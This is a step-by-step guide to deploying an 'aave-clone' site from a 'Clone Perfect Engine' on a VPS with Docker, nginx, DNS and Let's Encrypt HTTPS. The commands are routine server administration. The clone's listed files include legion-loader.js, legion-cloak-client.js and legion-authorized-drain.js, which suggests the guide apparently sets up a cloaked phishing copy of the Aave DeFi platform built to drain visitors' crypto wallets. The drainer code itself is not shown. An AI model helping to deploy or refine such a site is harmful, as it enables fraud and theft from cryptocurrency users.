## Prerequisites

### VPS Requirements

- **OS**: Ubuntu 20.04 LTS or Debian 11+
- **RAM**: 2GB minimum (4GB recommended)
- **Storage**: 20GB minimum
- **CPU**: 1 vCPU minimum (2+ recommended)
- **Network**: Open ports 80, 443, and your custom port (8080-8999)

### Local Requirements

- SSH client (built-in on Mac/Linux, PuTTY on Windows)
- Clone folder generated by Clone Perfect Engine
- Domain name (optional, but recommended)

### Software to Install on VPS

```bash
# Update system
apt-get update && apt-get upgrade -y

# Install Docker
apt-get install -y docker.io docker-compose

# Enable Docker service
systemctl start docker
systemctl enable docker

# Verify installation
docker --version
docker-compose --version
```

## VPS Setup

### Step 1: Create VPS Instance

Choose from:
- **DigitalOcean** ($4-6/month)
- **Linode** ($5/month)
- **AWS Lightsail** ($3.50/month)
- **Vultr** ($2.50/month)
- **Hetzner** ($3/month)

### Step 2: Get VPS Details

After creation, you'll receive:
```
IP Address: 123.45.67.89
Root Password: your-password
SSH Port: 22 (default)
```

### Step 3: SSH into VPS

**On Mac/Linux:**
```bash
ssh root@123.45.67.89
# Enter password when prompted
```

**On Windows (using PuTTY):**
1. Download PuTTY
2. Enter Host: `123.45.67.89`
3. Port: `22`
4. Click Open
5. Login as: `root`
6. Password: `your-password`

### Step 4: Change Root Password (Recommended)

```bash
passwd
# Enter new password twice
```

### Step 5: Create Deployment Directory

```bash
mkdir -p /opt/clones
cd /opt/clones
ls -la
```

## Upload Clone Files

### Option A: Using SCP (Recommended)

**From your local machine:**
```bash
# Upload entire clone folder
scp -r ~/Downloads/Legion/legion-engine/clones/aave-clone root@123.45.67.89:/opt/clones/

# Verify upload
ssh root@123.45.67.89 "ls -la /opt/clones/aave-clone"
```

### Option B: Using Git

**On VPS:**
```bash
cd /opt/clones
git clone https://your-repo-url.git aave-clone
cd aave-clone
```

### Option C: Using SFTP/FTP

Use FileZilla or WinSCP:
1. Connect to VPS IP with SSH/SFTP
2. Drag & drop folder to `/opt/clones/`

### Option D: Tar Archive (Fast)

**Locally:**
```bash
cd ~/Downloads/Legion/legion-engine/clones
tar -czf aave-clone.tar.gz aave-clone/
scp aave-clone.tar.gz root@123.45.67.89:/opt/clones/
```

**On VPS:**
```bash
cd /opt/clones
tar -xzf aave-clone.tar.gz
rm aave-clone.tar.gz
```

## Deploy with Docker

### Step 1: Navigate to Clone Folder

```bash
ssh root@123.45.67.89
cd /opt/clones/aave-clone
ls -la
```

Expected files:
```
docker-compose.yml
nginx.conf
legion-loader.js
legion-cloak-client.js
legion-authorized-drain.js
legion-statsig-mock.js
README.md
index.html
... (other site files)
```

### Step 2: Review Docker Compose

```bash
cat docker-compose.yml
```

Should look like:
```yaml
version: '3.8'
services:
  nginx:
    image: nginx:latest
    ports:
      - "8083:80"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf:ro
      - ./:/usr/share/nginx/html:ro
```

### Step 3: Start Docker Container

```bash
docker-compose up -d
```

**Output:**
```
Creating network "aave-clone_default" with the default driver
Creating aave-clone_nginx_1 ... done
```

### Step 4: Verify Container is Running

```bash
docker ps
```

**Output:**
```
CONTAINER ID   IMAGE     COMMAND               PORTS
abc12345       nginx     "nginx -g daemon"     0.0.0.0:8083->80/tcp
```

### Step 5: Test Site Locally

```bash
curl http://localhost:8083
```

Should return HTML content (long output, that's normal).

### Step 6: Check Logs

```bash
docker logs -f aave-clone_nginx_1
```

**Healthy logs:**
```
2024-06-26 10:30:45 - "GET / HTTP/1.1" 200
2024-06-26 10:30:46 - "GET /legion-loader.js HTTP/1.1" 200
```

## Domain & SSL Setup

### Option 1: Add Domain (Without SSL)

### Step 1: Update DNS

At your domain provider (GoDaddy, Namecheap, etc.):

**DNS Records:**
```
Type: A
Name: @ (or aave-clone)
Value: 123.45.67.89
TTL: 3600
```

**For subdomains:**
```
Type: A
Name: aave-clone
Value: 123.45.67.89
```

### Step 2: Update Nginx Config

```bash
nano /opt/clones/aave-clone/nginx.conf
```

Add to server block:
```nginx
server_name aave-clone.yourdomain.com;
```

### Step 3: Restart Docker

```bash
docker-compose restart
```

### Step 4: Test

```bash
curl http://aave-clone.yourdomain.com:8083
```

---

### Option 2: Add HTTPS (With SSL)

### Step 1: Install Certbot

```bash
apt-get install -y certbot python3-certbot-nginx
```

### Step 2: Get Certificate

```bash
certbot certonly --standalone \
  -d aave-clone.yourdomain.com \
  --non-interactive \
  --agree-tos \
  -m your-email@example.com
```

**Output:**
```
Successfully received certificate.
Certificate is saved at: /etc/letsencrypt/live/aave-clone.yourdomain.com/fullchain.pem
Key is saved at: /etc/letsencrypt/live/aave-clone.yourdomain.com/privkey.pem
```

### Step 3: Update Nginx Config

```bash
nano /opt/clones/aave-clone/nginx.conf
```

Update server block:
```nginx
server {
    listen 443 ssl http2;
    server_name aave-clone.yourdomain.com;
    
    ssl_certificate /etc/letsencrypt/live/aave-clone.yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/aave-clone.yourdomain.com/privkey.pem;
    
    # ... rest of config
}

# Redirect HTTP to HTTPS
server {
    listen 80;
    server_name aave-clone.yourdomain.com;
    return 301 https://$server_name$request_uri;
}
```

### Step 4: Update Docker Compose

```bash
nano /opt/clones/aave-clone/docker-compose.yml
```

Update ports:
```yaml
ports:
  - "80:80"
  - "443:443"
```

### Step 5: Restart Docker

```bash
docker-compose down
docker-compose up -d
```

### Step 6: Test HTTPS

```bash
curl https://aave-clone.yourdomain.com
```

### Step 7: Auto-Renew Certificate

```bash
# Create renewal script
cat > /etc/cron.d/certbot << EOF
0 3 * * * certbot renew --quiet --no-eff-email --non-interactive
EOF

# Verify
systemctl restart cron
```

## Monitoring & Maintenance

### View Running Containers

```bash
docker ps -a
```

### View Container Logs

```bash
# Real-time logs
docker logs -f aave-clone_nginx_1

# Last 100 lines
docker logs --tail 100 aave-clone_nginx_1

docker logs -f --timestamps aave-clone_nginx_1
```

## Troubleshooting

### Port Already in Use

```bash
# Find what's using port 8083
lsof -i :8083

# Kill the process
kill -9 <PID>

# Start container again
docker-compose up -d
```

### Docker Container Won't Start

```bash
# Check logs
docker logs aave-clone_nginx_1

# Common issues:
# - Port already in use
# - nginx.conf syntax error
# - Missing volume files

# Fix and restart
docker-compose down
docker-compose up -d
```

### Nginx Configuration Error

```bash
# Check syntax
docker exec aave-clone_nginx_1 nginx -t

# If error, fix nginx.conf
nano /opt/clones/aave-clone/nginx.conf

# Reload without restart
docker exec aave-clone_nginx_1 nginx -s reload
```

### Site Returns 404

```bash
# Check if files are present
ls -la /opt/clones/aave-clone/

# Verify volume mount in docker-compose.yml
cat docker-compose.yml | grep volumes

# Restart with correct paths
docker-compose down
docker-compose up -d
```

### SSL Certificate Errors

```bash
# Check certificate validity
openssl x509 -in /etc/letsencrypt/live/yourdomain.com/fullchain.pem -text -noout

# Check certificate expiry
certbot certificates

# Renew manually
certbot renew --force-renewal
```

### High Memory Usage

```bash
# Check memory
free -h

# Reduce nginx workers in config
nano /opt/clones/aave-clone/nginx.conf
# Change: worker_processes 4; → worker_processes 1;

# Restart
docker-compose restart
```

### Cannot Connect from Outside VPS

```bash
# Check firewall
ufw status

# Allow port
ufw allow 8083/tcp
ufw allow 80/tcp
ufw allow 443/tcp

# Reload firewall
ufw reload

# Test connectivity
curl http://your-vps-ip:8083
```

## Security Best Practices

1. **Change root password** after VPS creation
2. **Use SSH keys** instead of passwords
3. **Enable firewall** and restrict ports
4. **Use HTTPS** (SSL certificate)
5. **Keep system updated** (`apt-get update && apt-get upgrade`)
6. **Monitor logs** regularly
7. **Set up backups** of clone folder
8. **Use strong passwords** for any credentials
9. **Disable root login** via SSH (create sudo user)
10. **Use fail2ban** for brute-force protection
